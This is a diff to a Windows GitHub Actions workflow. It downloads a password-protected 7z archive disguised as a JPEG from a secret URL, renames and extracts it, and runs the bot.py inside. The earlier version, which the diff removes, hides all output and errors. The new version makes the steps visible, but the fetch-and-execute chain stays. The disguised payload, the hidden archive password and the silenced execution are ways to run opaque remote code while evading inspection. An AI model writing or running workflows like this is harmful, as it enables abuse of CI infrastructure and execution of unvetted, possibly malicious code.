@@ -22,34 +22,42 @@ jobs:
         with:
           python-version: "3.10"
 
-      - name: Prepare dependencies (silent)
+      - name: Prepare dependencies
         shell: powershell
         run: |
-          choco install 7zip -y --no-progress > $null
+          choco install 7zip -y --no-progress
 
-      - name: Download package (jpg disguised)
+      - name: Download package
         shell: powershell
         env:
           SRC_URL: ${{ secrets.LINK }}
         run: |
-          $ProgressPreference = 'SilentlyContinue'
-          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "p.jpg" > $null
+          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "p.jpg"
 
       - name: Rename & extract package
         shell: powershell
         env:
           ARCHIVE_KEY: ${{ secrets.PASSWORD }}
         run: |
-          Rename-Item p.jpg p.7z
-          & "C:\Program Files\7-Zip\7z.exe" x p.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null
+          $ErrorActionPreference = "Stop"
+
+          Rename-Item p.jpg p.7z -Force
+
+          & "C:\Program Files\7-Zip\7z.exe" x p.7z -p"$Env:ARCHIVE_KEY" -oextracted -y
+
+          Write-Host "===== Extracted Files ====="
+          Get-ChildItem -Recurse extracted
 
       - name: Run worker (bot.py only)
         shell: powershell
         run: |
-          $ErrorActionPreference = 'SilentlyContinue'
+          $ErrorActionPreference = "Stop"
 
           $botPath = "extracted\bot.py"
 
-          if (-Not (Test-Path $botPath)) { exit 0 }
+          if (-Not (Test-Path $botPath)) {
+              Write-Error "bot.py not found in extracted folder"
+          }
 
-          cmd /c "python `"$botPath`" > nul 2>&1"
+          Write-Host "Running bot.py..."
+          python $botPath
